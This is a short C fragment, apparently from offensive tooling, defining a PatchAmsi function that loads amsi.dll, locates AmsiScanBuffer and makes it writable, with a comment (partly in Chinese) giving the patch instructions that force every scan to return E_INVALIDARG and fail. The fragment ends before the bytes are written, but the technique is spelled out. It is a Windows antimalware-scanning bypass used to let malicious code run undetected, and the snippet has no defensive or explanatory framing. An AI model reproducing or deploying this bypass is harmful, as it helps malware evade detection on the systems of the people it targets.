void PatchAmsi() {
    HMODULE a = LoadLibraryA("amsi.dll");
    if (!a) return;
    FARPROC f = GetProcAddress(a, "AmsiScanBuffer");
    if (!f) return;
    DWORD old;
    VirtualProtect(f, 8, PAGE_EXECUTE_READWRITE, &old);
    // x64: mov rax, 0x80070057 ; ret  → 返回 E_INVALIDARG，扫描直接失败
